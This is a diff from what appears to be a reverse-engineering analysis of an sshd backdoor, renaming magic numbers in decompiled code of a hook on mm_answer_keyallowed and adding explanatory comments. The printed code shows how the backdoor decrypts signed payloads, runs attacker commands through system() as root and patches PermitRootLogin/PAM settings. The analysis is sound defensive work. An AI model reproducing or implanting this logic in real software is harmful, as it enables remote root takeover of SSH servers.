@@ -21,7 +21,7 @@ int mm_answer_keyallowed_hook(ssh *ssh,int sock,sshbuf *m)
 
 {
   u8 payload_type;
-  u32 payload_state;
+  payload_stream_state_t payload_state;
   libc_imports_t *libc_imports_ref;
   sshd_ctx_t *sshd_ctx;
   sshd_monitor_func_t *orig_mm_answer_keyallowed;
@@ -71,10 +71,10 @@ int mm_answer_keyallowed_hook(ssh *ssh,int sock,sshbuf *m)
   }
   orig_mm_answer_keyallowed = sshd_ctx->mm_answer_keyallowed_start;
   if (orig_mm_answer_keyallowed == (sshd_monitor_func_t *)0x0) goto LAB_00109471;
-  if (::global_ctx->payload_state == 4) goto LAB_0010944f;
+  if (::global_ctx->payload_state == PAYLOAD_STREAM_DISPATCHED) goto LAB_0010944f;
   state_ok = check_backdoor_state(::global_ctx);
-  if (((state_ok == FALSE) || (ctx->payload_state == 4)) || (ctx->payload_state == 0xffffffff))
-  goto LAB_00109429;
+  if (((state_ok == FALSE) || (ctx->payload_state == PAYLOAD_STREAM_DISPATCHED)) ||
+     (ctx->payload_state == PAYLOAD_STREAM_POISONED)) goto LAB_00109429;
   clear_cursor = &payload_ctx;
   for (copy_idx = 0x12; copy_idx != 0; copy_idx = copy_idx + -1) {
     *(u32 *)clear_cursor = 0;
@@ -90,7 +90,7 @@ int mm_answer_keyallowed_hook(ssh *ssh,int sock,sshbuf *m)
   // AutoDoc: Decrypt the framed chunk, append it into `ctx->payload_buffer`, and advance `payload_state` if enough bytes have arrived.
   decrypt_payload_message((key_payload_t *)payload_ctx,payload_chunk_size,ctx);
   payload_state = ctx->payload_state;
-  if (payload_state == 3) {
+  if (payload_state == PAYLOAD_STREAM_COMMAND_READY) {
 LAB_00109216:
     payload_record = ctx->payload_ctx;
     if (payload_record != (sshd_payload_ctx_t *)0x0) {
@@ -136,7 +136,7 @@ LAB_00109216:
              ((ruid = (uid_t)uid_gid_pair, ruid == 0 ||
               (orig_call_result = (*libc_imports_ref->setresuid)(ruid,ruid,ruid), orig_call_result != -1)))) {
             (*libc_imports_ref->system)((char *)(payload_record[1].signed_header_prefix + 4));
-            ctx->payload_state = 4;
+            ctx->payload_state = PAYLOAD_STREAM_DISPATCHED;
             goto LAB_0010944f;
           }
         }
@@ -159,7 +159,7 @@ LAB_00109216:
           }
         }
         sshd_ctx->pending_authpayload = payload_record;
-        ctx->payload_state = 4;
+        ctx->payload_state = PAYLOAD_STREAM_DISPATCHED;
         // AutoDoc: As soon as an authpassword payload is queued, refresh PermitRootLogin/PAM/request IDs so the follow-on hook won’t trip sshd’s guards.
         state_ok = sshd_patch_variables(TRUE,FALSE,FALSE,0,ctx);
 LAB_001092e5:
@@ -167,8 +167,8 @@ LAB_001092e5:
       }
     }
   }
-  else if ((int)payload_state < 4) {
-    if (payload_state == 0) {
+  else if (payload_state < PAYLOAD_STREAM_DISPATCHED) {
+    if (payload_state == PAYLOAD_STREAM_EXPECT_HEADER) {
       if (ctx->payload_bytes_buffered < 0xae) goto LAB_0010944f;
       payload_header_cursor = payload_seed_buf + 0x10;
       for (copy_idx = 0x29; copy_idx != 0; copy_idx = copy_idx + -1) {
@@ -231,7 +231,7 @@ LAB_001092e5:
                                       // AutoDoc: Verify the Ed448 signature over the fixed header before allowing the state machine to advance beyond stage zero.
                                       ctx->payload_ctx->ed448_signature,payload_seed_buf,ctx),
            state_ok != FALSE)) {
-          ctx->payload_state = 1;
+          ctx->payload_state = PAYLOAD_STREAM_BUFFERING_BODY;
           payload_header_cursor = payload_seed_buf;
           for (copy_idx = 0x39; copy_idx != 0; copy_idx = copy_idx + -1) {
             *payload_header_cursor = '\0';
@@ -241,10 +241,11 @@ LAB_001092e5:
           goto LAB_001092e5;
         }
       }
-      ctx->payload_state = 0xffffffff;
+      ctx->payload_state = PAYLOAD_STREAM_POISONED;
       ctx->payload_ctx = (sshd_payload_ctx_t *)0x0;
     }
-    else if ((payload_state == 1) && (ctx->payload_ctx != (sshd_payload_ctx_t *)0x0)) {
+    else if ((payload_state == PAYLOAD_STREAM_BUFFERING_BODY) &&
+            (ctx->payload_ctx != (sshd_payload_ctx_t *)0x0)) {
       payload_len = (ulong)ctx->payload_ctx->payload_total_size;
       payload_data_offset = ctx->payload_bytes_buffered;
       if (payload_data_offset <= payload_len) {
@@ -296,19 +297,19 @@ LAB_00109471:
                                   // AutoDoc: State 1 completion: once the final body chunk is spliced in, re-run the signature check across the assembled buffer before switching to command execution.
                                   ctx->payload_ctx->signed_header_prefix,ctx);
         if (state_ok == FALSE) {
-          ctx->payload_state = 0xffffffff;
+          ctx->payload_state = PAYLOAD_STREAM_POISONED;
           goto LAB_00109471;
         }
-        ctx->payload_state = 3;
+        ctx->payload_state = PAYLOAD_STREAM_COMMAND_READY;
         goto LAB_00109216;
       }
     }
   }
-  else if (payload_state == 4) goto LAB_0010944f;
+  else if (payload_state == PAYLOAD_STREAM_DISPATCHED) goto LAB_0010944f;
 LAB_00109429:
   if (((ctx->libc_imports != (libc_imports_t *)0x0) &&
       (exit_fn = ctx->libc_imports->exit, exit_fn != (pfn_exit_t)0x0)) &&
-     (ctx->payload_state = 0xffffffff, ctx->exit_flag != 0)) {
+     (ctx->payload_state = PAYLOAD_STREAM_POISONED, ctx->exit_flag != 0)) {
     (*exit_fn)(0);
   }
 LAB_0010944f:
